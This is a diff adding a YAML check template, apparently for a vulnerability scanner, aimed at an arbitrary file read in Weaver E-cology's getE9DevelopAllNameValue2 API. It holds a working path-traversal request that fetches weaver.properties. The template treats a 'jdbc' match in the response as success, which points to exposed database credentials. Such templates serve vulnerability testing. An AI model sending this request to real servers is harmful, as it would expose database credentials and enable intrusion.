@@ -1,0 +1,19 @@
+id:
+
+info:
+  name: 泛微E-cology getE9DevelopAllNameValue2任意文件读取
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /api/portalTsLogin/utils/getE9DevelopAllNameValue2?fileName=portaldev_%2f%2e%2e%2fweaver%2eproperties
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+response1:
+  headers:
+  body: jdbc
+  code:
+requests2:
+response2:
